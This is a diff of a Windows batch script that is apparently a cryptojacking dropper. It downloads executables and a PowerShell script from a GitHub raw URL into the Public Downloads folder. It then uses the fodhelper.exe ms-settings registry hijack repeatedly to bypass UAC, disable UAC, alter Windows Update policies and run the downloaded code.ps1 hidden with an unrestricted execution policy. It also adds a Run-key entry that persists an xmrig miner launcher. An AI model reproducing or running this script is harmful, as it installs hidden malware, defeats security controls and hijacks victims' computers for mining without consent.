@@ -4,6 +4,7 @@ powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarro
 cls
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/main.exe" -OutFile "C:\Users\Public\Downloads\main.exe";
+powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/code.ps1" -OutFile "C:\Users\Public\Downloads\code.ps1";
 cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA 0""" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
@@ -31,16 +32,6 @@ powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn 
 fodhelper.exe
 cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\WindowsUpdate\AU AlwaysAutoRebootAtScheduledTime 0""" -Force
-powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
-powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
-fodhelper.exe
-cls
-powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force
-powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
-powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
-fodhelper.exe
-cls
-powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
 fodhelper.exe
@@ -84,6 +75,12 @@ powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value 
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
 fodhelper.exe
+cls
+powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command -executionpolicy unrestricted C:\Users\Public\Downloads\code.ps1""" -Force
+powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
+powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
+fodhelper.exe
+cls
 cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run nomee111 C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd""" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
